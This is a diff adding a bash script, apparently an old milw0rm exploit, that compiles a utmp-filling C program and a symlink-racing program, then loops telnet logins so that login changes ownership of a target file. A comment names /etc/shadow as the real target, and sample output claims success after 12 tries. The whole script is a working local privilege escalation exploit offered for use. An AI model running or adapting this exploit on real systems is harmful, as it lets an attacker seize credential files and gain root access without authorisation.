@@ -1,0 +1,98 @@
+#!/bin/bash -
+
+echo '
+	#include <string.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <utmp.h>
+	#include <sys/types.h>
+	#include <stdio.h>
+
+	int main(int argc, char *argv[])
+	{
+	  struct utmp entry;
+	  int i;
+
+	  entry.ut_type=LOGIN_PROCESS;
+	  strcpy(entry.ut_line,"/tmp/x");
+	  entry.ut_time=0;
+	  strcpy(entry.ut_user,"badguy");
+	  strcpy(entry.ut_host,"badhost");
+	  entry.ut_addr=0;
+	  for(i=1;i<9;i++) {
+	    entry.ut_pid=(pid_t)( i + (int)getpid() );
+	    sprintf(entry.ut_id,"bad%d",i);
+	    pututline(&entry);
+	  }
+	}
+' > /tmp/fillutmp.c
+
+cc -o /tmp/fillutmp /tmp/fillutmp.c
+
+echo 'Ask someone with group utmp privileges to do:'
+echo '  chgrp utmp /tmp/fillutmp; chmod 2755 /tmp/fillutmp'
+echo -n 'Press [RETURN] to continue... '
+read ANS
+
+echo '
+	#include <unistd.h>
+
+	int main(int argc, char *argv[])
+	{
+	  while(1)
+	  {
+	    unlink("/tmp/x");
+	    symlink(argv[1],"/tmp/x");
+	    unlink("/tmp/x");
+	    symlink(argv[2],"/tmp/x");
+	  }
+	}
+' > /tmp/jigglelnk.c
+
+cc -o /tmp/jigglelnk /tmp/jigglelnk.c
+
+HOST=`hostname` # or simply localhost?
+echo "Which tty do you think a 'telnet $HOST' will use next?"
+echo "(Do that telnet and see...)"
+read TTY
+echo "You said it will be '$TTY' ..."
+
+ATK=/etc/debian_version # should be /etc/shadow
+
+echo "Starting symlink re-jiggler ..."
+/tmp/jigglelnk $TTY $ATK &
+JIG=$!
+
+LOOP=0
+while :; do
+  ((LOOP = $LOOP + 1))
+  echo; echo; echo "Try = $LOOP"
+
+  /tmp/fillutmp
+
+  echo "Telnetting... if login succeeds, just exit for next try..."
+  /usr/bin/telnet $HOST
+
+  LS=`ls -ld $ATK`
+  case "$LS" in
+    *root*root* ) ;; # not done yet...
+    * )
+      echo; echo
+      echo "Success after $LOOP tries!"
+      echo "$LS"
+      echo; echo
+      break
+    ;;
+  esac
+done
+
+kill $JIG
+rm /tmp/fillutmp /tmp/jigglelnk /tmp/x
+
+# ...
+# ~$ logout
+# Connection closed by foreign host.
+# Success after 12 tries!
+# -rw------- 1 psz tty 4 Oct 28  2006 /etc/debian_version
+
+# milw0rm.com [2008-12-01]
